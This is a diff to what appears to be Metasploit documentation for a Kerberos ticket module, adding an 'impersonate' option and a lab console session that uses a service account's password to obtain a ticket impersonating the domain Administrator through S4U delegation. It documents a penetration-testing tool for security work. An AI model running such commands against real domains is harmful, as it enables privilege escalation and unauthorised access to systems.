@@ -49,6 +49,10 @@ keys: 128 or 256 bits.
 The Service Principal Name, the format is `service_name/FQDN` . Ex:
 cifs/dc01.mydomain.local. This option is only used when requesting a TGS.
 
+### IMPERSONATE
+The user on whose behalf a TGS is requested (it will use S4U2Self/S4U2Proxy to
+request the ticket).
+
 ### KrbUseCachedCredentials
 If set to `true`, it looks for a matching TGT in the database and, if found,
 use it for Kerberos authentication. Default is `true`.
@@ -233,5 +237,28 @@ host             service  type                 name  content                   i
 10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: cifs/dc02.mylab.local, username: administrator  /home/msfuser/.msf4/loot/20221104183244_default_10.0.0.24_mit.kerberos.cca_360960.bin
 10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: krbtgt/mylab.local, username: administrator     /home/msfuser/.msf4/loot/20221104183538_default_10.0.0.24_mit.kerberos.cca_200958.bin
 10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: cifs/dc02.mylab.local, username: administrator  /home/msfuser/.msf4/loot/20221104183538_default_10.0.0.24_mit.kerberos.cca_849639.bin
+```
+
+- TGS impersonating the Administrator account
+```
+msf6 auxiliary(admin/kerberos/get_ticket) > run verbose=true rhosts=10.0.0.24 domain=mylab.local user=serviceA password=123456 action=GET_TGS spn=cifs/dc02.mylab.local impersonate=Administrator
+[*] Running module against 10.0.0.24
+
+[*] 10.0.0.24:88 - Getting TGS impersonating Administrator@mylab.local (SPN: cifs/dc02.mylab.local)
+[+] 10.0.0.24:88 - Received a valid TGT-Response
+[*] 10.0.0.24:88 - TGT MIT Credential Cache saved to /home/msfuser/.msf4/loot/20221201210211_default_10.0.0.24_mit.kerberos.cca_667626.bin
+[+] 10.0.0.24:88 - Received a valid TGS-Response
+[+] 10.0.0.24:88 - Received a valid TGS-Response
+[*] 10.0.0.24:88 - TGS MIT Credential Cache saved to /home/msfuser/.msf4/loot/20221201210211_default_10.0.0.24_mit.kerberos.cca_757041.bin
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/kerberos/get_ticket) > loot
+
+Loot
+====
+
+host             service  type                 name  content                   info                                                                             path
+----             -------  ----                 ----  -------                   ----                                                                             ----
+10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: krbtgt/mylab.local, username: servicea          /home/msfuser/.msf4/loot/20221201210211_default_10.0.0.24_mit.kerberos.cca_667626.bin
+10.0.0.24                 mit.kerberos.ccache        application/octet-stream  realm: MYLAB.LOCAL, serviceName: cifs/dc02.mylab.local, username: administrator  /home/msfuser/.msf4/loot/20221201210211_default_10.0.0.24_mit.kerberos.cca_757041.bin
 ```
 
